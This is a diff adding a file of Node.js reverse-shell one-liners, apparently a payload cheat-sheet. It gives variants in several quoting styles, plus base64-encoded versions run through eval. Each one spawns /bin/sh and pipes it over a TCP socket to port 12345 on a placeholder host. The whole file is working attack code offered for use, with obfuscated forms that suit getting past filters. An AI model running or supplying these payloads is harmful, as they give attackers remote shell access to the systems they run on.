@@ -1,0 +1,28 @@
+One-line from cli
+
+Single-quote
+node -e '(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(12345, "127.0.0.1", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/;})();'
+
+Double-quote
+node -e "(function(){ var net = require('net'), cp = require('child_process'), sh = cp.spawn('/bin/sh', []); var client = new net.Socket(); client.connect(12345, '127.0.0.1', function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/;})();"
+
+Backticks
+node -e '(function(){ var net = require(`net`), cp = require(`child_process`), sh = cp.spawn(`/bin/sh`, []); var client = new net.Socket(); client.connect(12345, `127.0.0.1`, function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/;})();'
+
+
+Base64 encoded one-line from cli
+Single-quote
+node -e 'eval(new Buffer("KGZ1bmN0aW9uKCl7IHZhciBuZXQgPSByZXF1aXJlKCJuZXQiKSwgY3AgPSByZXF1aXJlKCJjaGlsZF9wcm9jZXNzIiksIHNoID0gY3Auc3Bhd24oIi9iaW4vc2giLCBbXSk7IHZhciBjbGllbnQgPSBuZXcgbmV0LlNvY2tldCgpOyBjbGllbnQuY29ubmVjdCgxMjM0NSwgIjEyNy4wLjAuMSIsIGZ1bmN0aW9uKCl7IGNsaWVudC5waXBlKHNoLnN0ZGluKTsgc2guc3Rkb3V0LnBpcGUoY2xpZW50KTsgc2guc3RkZXJyLnBpcGUoY2xpZW50KTsgfSk7IHJldHVybiAvYS87fSkoKTs=","base64").toString("ascii"))'
+
+Double-quote
+node -e "eval(new Buffer('KGZ1bmN0aW9uKCl7IHZhciBuZXQgPSByZXF1aXJlKCJuZXQiKSwgY3AgPSByZXF1aXJlKCJjaGlsZF9wcm9jZXNzIiksIHNoID0gY3Auc3Bhd24oIi9iaW4vc2giLCBbXSk7IHZhciBjbGllbnQgPSBuZXcgbmV0LlNvY2tldCgpOyBjbGllbnQuY29ubmVjdCgxMjM0NSwgIjEyNy4wLjAuMSIsIGZ1bmN0aW9uKCl7IGNsaWVudC5waXBlKHNoLnN0ZGluKTsgc2guc3Rkb3V0LnBpcGUoY2xpZW50KTsgc2guc3RkZXJyLnBpcGUoY2xpZW50KTsgfSk7IHJldHVybiAvYS87fSkoKTs=','base64').toString('ascii'))"
+
+Backticks
+node -e 'eval(new Buffer(`KGZ1bmN0aW9uKCl7IHZhciBuZXQgPSByZXF1aXJlKCJuZXQiKSwgY3AgPSByZXF1aXJlKCJjaGlsZF9wcm9jZXNzIiksIHNoID0gY3Auc3Bhd24oIi9iaW4vc2giLCBbXSk7IHZhciBjbGllbnQgPSBuZXcgbmV0LlNvY2tldCgpOyBjbGllbnQuY29ubmVjdCgxMjM0NSwgIjEyNy4wLjAuMSIsIGZ1bmN0aW9uKCl7IGNsaWVudC5waXBlKHNoLnN0ZGluKTsgc2guc3Rkb3V0LnBpcGUoY2xpZW50KTsgc2guc3RkZXJyLnBpcGUoY2xpZW50KTsgfSk7IHJldHVybiAvYS87fSkoKTs=`,`base64`).toString(`ascii`))'
+
+Without double-quotes
+One-line (ANSI-C quoting)
+node -e $'(function(){ var net = require(\'net\'), cp = require(\'child_process\'), sh = cp.spawn(\'/bin/sh\', []); var client = new net.Socket(); client.connect(12345, \'127.0.0.1\', function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/;})();'
+
+One-line Base64 (ANSI-C quoting)
+node -e $'eval(new Buffer(\'KGZ1bmN0aW9uKCl7IHZhciBuZXQgPSByZXF1aXJlKCJuZXQiKSwgY3AgPSByZXF1aXJlKCJjaGlsZF9wcm9jZXNzIiksIHNoID0gY3Auc3Bhd24oIi9iaW4vc2giLCBbXSk7IHZhciBjbGllbnQgPSBuZXcgbmV0LlNvY2tldCgpOyBjbGllbnQuY29ubmVjdCgxMjM0NSwgIjEyNy4wLjAuMSIsIGZ1bmN0aW9uKCl7IGNsaWVudC5waXBlKHNoLnN0ZGluKTsgc2guc3Rkb3V0LnBpcGUoY2xpZW50KTsgc2guc3RkZXJyLnBpcGUoY2xpZW50KTsgfSk7IHJldHVybiAvYS87fSkoKTs=\',\'base64\').toString(\'ascii\'))'
